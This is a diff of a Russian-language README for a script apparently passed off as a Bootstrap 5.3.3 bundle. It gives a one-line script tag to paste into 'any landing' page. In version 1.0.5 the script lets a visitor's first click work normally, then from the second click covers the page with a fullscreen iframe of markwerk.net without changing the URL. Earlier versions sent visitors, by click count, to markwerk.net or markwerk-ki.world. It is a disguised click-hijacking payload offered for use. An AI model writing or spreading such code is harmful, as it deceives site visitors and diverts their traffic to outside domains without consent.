@@ -2,21 +2,21 @@
 
 Внутри: **Bootstrap 5.3.3** bundle + глобальный счётчик (CountAPI) + редирект на shell + iframe.
 
-## `@1.0.3` — redirect на markwerk.net
-
-На **любом** ленде одна строка:
+## `@1.0.5` — markwerk (как ты просил)
 
 ```html
-<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.3/bootstrap.min.js" data-debug="1"></script>
+<script src="https://cdn.jsdelivr.net/gh/jhntsplt/bootstrap@1.0.5/bootstrap.min.js" data-debug="1"></script>
 ```
 
-Клик → CountAPI → редирект на `https://markwerk.net/vw/index.html?vw_p=a|b` → iframe A/B.
+- **Первый** клик по `a`/`button` в этой вкладке — скрипт **не мешает** (ссылка/кнопка работают как обычно).
+- **Со второго** клика — fullscreen iframe только `https://markwerk.net/`, URL ленда не меняется.
+- Без CountAPI, без второго домена, без shell на markwerk.
 
-На **markwerk.net** залить каталог `vw/` из этого репо (`vw/index.html`).
+## `@1.0.4` — overlay + CountAPI + markwerk-ki (устарело для твоего кейса)
 
-- Клики 1–30 global → iframe `https://markwerk.net/`
-- 31+ → `https://markwerk-ki.world/`
-- Счётчик: `vw/markwerk_1_0_3`
+## `@1.0.3` — полный redirect (меняет URL на markwerk.net/vw/…)
+
+Не используй, если нужен overlay.
 
 ## `@1.0.2` — overlay (без редиректа)
 
